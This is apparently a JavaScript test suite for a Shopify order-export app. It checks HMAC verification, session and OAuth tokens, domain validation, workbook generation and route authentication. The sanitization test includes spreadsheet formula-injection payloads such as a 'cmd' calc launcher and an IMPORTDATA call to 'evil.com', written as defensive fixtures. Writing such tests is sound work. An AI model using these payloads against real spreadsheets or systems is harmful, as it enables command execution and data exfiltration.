const assert = require('assert');
const crypto = require('crypto');
const http = require('http');
const db = require('./db');
const shopify = require('./shopify');
const { generateOrdersWorkbook, sanitizeCell } = require('./export_engine');
const { app } = require('./server');

async function runTests() {
  console.log('--- [OrderDrop Test Suite] Starting Verification ---');
  let passed = 0;
  let failed = 0;

  function test(name, fn) {
    try {
      fn();
      console.log(`  ✅ PASS: ${name}`);
      passed++;
    } catch (err) {
      console.error(`  ❌ FAIL: ${name} ->`, err.message);
      failed++;
    }
  }

  async function testAsync(name, fn) {
    try {
      await fn();
      console.log(`  ✅ PASS: ${name}`);
      passed++;
    } catch (err) {
      console.error(`  ❌ FAIL: ${name} ->`, err.message);
      failed++;
    }
  }

  // Test 1: Database CRUD & Multi-Tenancy Isolation
  test('DB: Save and retrieve multi-tenant store data', () => {
    const testDomain = 'test-audit-store.myshopify.com';
    const saved = db.saveShop(testDomain, {
      recipientEmail: 'warehouse@teststore.com',
      scheduleTime: '09:00',
      autoDispatchEnabled: true
    });
    assert.strictEqual(saved.shop, testDomain);
    assert.strictEqual(saved.recipientEmail, 'warehouse@teststore.com');

    const fetched = db.getShop(testDomain);
    assert.strictEqual(fetched.scheduleTime, '09:00');
    assert.strictEqual(fetched.autoDispatchEnabled, true);

    // Clean up
    db.deleteShop(testDomain);
    assert.strictEqual(db.getShop(testDomain), null);
  });

  // Test 2: HMAC Verification Algorithm
  test('Shopify: Timing-safe HMAC calculation and verification', () => {
    const secret = 'mock_secret_key_12345';
    const params = {
      code: 'auth_code_xyz',
      shop: 'test-store.myshopify.com',
      timestamp: '1793552000'
    };

    const sorted = Object.keys(params).sort().map(k => `${k}=${params[k]}`).join('&');
    const validHmac = crypto.createHmac('sha256', secret).update(sorted).digest('hex');

    const isValid = shopify.verifyHmac({ ...params, hmac: validHmac }, secret);
    assert.strictEqual(isValid, true);

    const isInvalid = shopify.verifyHmac({ ...params, hmac: 'forged_hmac_signature' }, secret);
    assert.strictEqual(isInvalid, false);
  });

  // Test 3: Webhook HMAC Verification
  test('Shopify: Webhook raw body HMAC verification', () => {
    const secret = 'mock_secret_key_12345';
    const rawBody = JSON.stringify({ shop_domain: 'store.myshopify.com' });
    const headerHmac = crypto.createHmac('sha256', secret).update(rawBody, 'utf8').digest('base64');

    const isValid = shopify.verifyWebhookHmac(rawBody, headerHmac, secret);
    assert.strictEqual(isValid, true);

    const isInvalid = shopify.verifyWebhookHmac(rawBody, 'tampered_base64_hmac', secret);
    assert.strictEqual(isInvalid, false);
  });

  // Test 4: Excel Generation Engine with Real Orders
  await testAsync('Excel: Generates valid workbook buffer with order items', async () => {
    const sampleOrders = [
      {
        name: '#1001',
        date: '2026-11-01',
        customer: 'Test Buyer',
        email: 'buyer@test.com',
        sku: 'TEST-SKU-01',
        item: 'Yoga Mat Pro',
        qty: 2,
        unitPrice: '$45.00',
        total: '$90.00',
        status: 'UNFULFILLED',
        address: '123 Main St, New York, NY'
      }
    ];

    const { buffer, filename } = await generateOrdersWorkbook(sampleOrders, 'test-shop.myshopify.com');
    assert(Buffer.isBuffer(buffer));
    assert(buffer.length > 3000, `Buffer length is ${buffer.length}, expected > 3000 bytes`);
    assert(filename.startsWith('test-shop_Orders_'));
    assert(filename.endsWith('.xlsx'));
  });

  // Test 5: Excel Generation with 0 Orders (Graceful Empty State)
  await testAsync('Excel: Generates valid workbook buffer when 0 orders pending', async () => {
    const { buffer, filename } = await generateOrdersWorkbook([], 'hk-mart.myshopify.com');
    assert(Buffer.isBuffer(buffer));
    assert(buffer.length > 2000);
    assert(filename.includes('hk-mart_Orders_'));
  });

  // Test 6: Security - Subdomain Validation (SSRF & Redirection attack defense)
  test('Security: Shop domain regex validation strictly permits valid myshopify domains', () => {
    assert.strictEqual(shopify.isValidShopDomain('my-valid-store.myshopify.com'), true);
    assert.strictEqual(shopify.isValidShopDomain('hk-mart-cfoepmjd.myshopify.com'), true);
    assert.strictEqual(shopify.isValidShopDomain('store123.myshopify.com'), true);

    assert.strictEqual(shopify.isValidShopDomain('evil.com'), false);
    assert.strictEqual(shopify.isValidShopDomain('my-store.myshopify.com.evil.com'), false);
    assert.strictEqual(shopify.isValidShopDomain('http://my-store.myshopify.com'), false);
    assert.strictEqual(shopify.isValidShopDomain('my-store.myshopify.com/admin'), false);
    assert.strictEqual(shopify.isValidShopDomain(''), false);
    assert.strictEqual(shopify.isValidShopDomain(null), false);
  });

  // Test 7: Security - Signed HMAC Session Tokens
  test('Security: Cryptographic session token generation and verification', () => {
    const secret = 'super_secret_app_key_555';
    const shop = 'secure-merchant.myshopify.com';

    const token = shopify.createSessionToken(shop, secret);
    assert.strictEqual(typeof token, 'string');
    assert(token.includes('.'));

    assert.strictEqual(shopify.verifySessionToken(token, shop, secret), true);

    const tampered = token.slice(0, -4) + 'abcd';
    assert.strictEqual(shopify.verifySessionToken(tampered, shop, secret), false);
    assert.strictEqual(shopify.verifySessionToken(token, 'other-shop.myshopify.com', secret), false);
  });

  // Test 8: Security - Excel / CSV Formula Injection Sanitization (CVE defense)
  test('Security: sanitizeCell neutralizes CSV/Excel formula injection vectors', () => {
    assert.strictEqual(sanitizeCell('=SUM(A1:A10)'), "'=SUM(A1:A10)");
    assert.strictEqual(sanitizeCell('+cmd|/c calc'), "'+cmd|/c calc");
    assert.strictEqual(sanitizeCell('-1+1'), "'-1+1");
    assert.strictEqual(sanitizeCell('@IMPORTDATA("http://evil.com")'), "'@IMPORTDATA(\"http://evil.com\")");
    assert.strictEqual(sanitizeCell('\t=cmd'), "'\t=cmd");
    assert.strictEqual(sanitizeCell('\r=cmd'), "'\r=cmd");

    assert.strictEqual(sanitizeCell('#1001'), '#1001');
    assert.strictEqual(sanitizeCell('Yoga Mat Pro'), 'Yoga Mat Pro');
    assert.strictEqual(sanitizeCell(42), 42);
  });

  // Test 9: Security - OAuth State Nonce CSRF Protection
  test('Security: Cryptographic OAuth state nonce prevents CSRF & cross-shop replay', () => {
    const secret = 'oauth_state_secret_999';
    const shop = 'merchant-a.myshopify.com';
    const state = shopify.createOAuthState(shop, secret);

    assert.strictEqual(shopify.verifyOAuthState(state, shop, secret), true);
    assert.strictEqual(shopify.verifyOAuthState(state, 'merchant-b.myshopify.com', secret), false);
    assert.strictEqual(shopify.verifyOAuthState(state + 'x', shop, secret), false);

    const expiredState = shopify.createOAuthState(shop, secret, -1000);
    assert.strictEqual(shopify.verifyOAuthState(expiredState, shop, secret), false);
  });

  // Test 10: Security - Shopify App Bridge JWT Verification
  test('Security: Verifies Shopify App Bridge HS256 JWT session tokens', () => {
    const clientId = 'test_client_id';
    const clientSecret = 'test_client_secret';
    const shop = 'jwt-shop.myshopify.com';
    const nowSec = Math.floor(Date.now() / 1000);

    const header = Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })).toString('base64url');
    const payload = Buffer.from(JSON.stringify({
      iss: `https://${shop}/admin`,
      dest: `https://${shop}`,
      aud: clientId,
      exp: nowSec + 300,
      nbf: nowSec - 5
    })).toString('base64url');
    const sig = crypto.createHmac('sha256', clientSecret).update(`${header}.${payload}`).digest('base64url');
    const validJwt = `${header}.${payload}.${sig}`;

    assert.strictEqual(shopify.verifyAppBridgeJwt(validJwt, clientId, clientSecret, shop), true);
    assert.strictEqual(shopify.verifyAppBridgeJwt(validJwt, clientId, clientSecret, 'wrong-shop.myshopify.com'), false);
    assert.strictEqual(shopify.verifyAppBridgeJwt(validJwt, 'wrong_client', clientSecret, shop), false);
  });

  // Test 11 & 12: Live Express Route Security Integration Tests
  const server = http.createServer(app);
  await new Promise(resolve => server.listen(0, '127.0.0.1', resolve));
  const port = server.address().port;
  const baseUrl = `http://127.0.0.1:${port}`;

  try {
    await testAsync('Route Security: Unauthenticated GET /?shop=... is blocked (401) with zero token leak', async () => {
      const res = await fetch(`${baseUrl}/?shop=hk-mart-cfoepmjd.myshopify.com`);
      assert.strictEqual(res.status, 401, `Expected 401, got ${res.status}`);
      const text = await res.text();
      assert(!text.includes('const sessionToken ='), 'Must not mint or leak sessionToken on unauthenticated request');
      assert(!text.includes('sunitajoshi98765'), 'Must not leak merchant email on unauthenticated request');
    });

    await testAsync('Route Security: Unauthenticated Billing endpoints (/subscribe & /confirm) are blocked (401)', async () => {
      const subRes = await fetch(`${baseUrl}/api/billing/subscribe?shop=hk-mart-cfoepmjd.myshopify.com&plan=annual`);
      assert.strictEqual(subRes.status, 401, `Expected 401 on /subscribe, got ${subRes.status}`);

      const confRes = await fetch(`${baseUrl}/api/billing/confirm?shop=hk-mart-cfoepmjd.myshopify.com&plan=annual`);
      assert.strictEqual(confRes.status, 401, `Expected 401 on /confirm, got ${confRes.status}`);
    });
  } finally {
    await new Promise(resolve => server.close(resolve));
  }

  console.log('--- [Test Suite Summary] ---');
  console.log(`  Total: ${passed + failed} | Passed: ${passed} | Failed: ${failed}`);
  await db.close();
  if (failed > 0) process.exitCode = 1;
}

runTests();
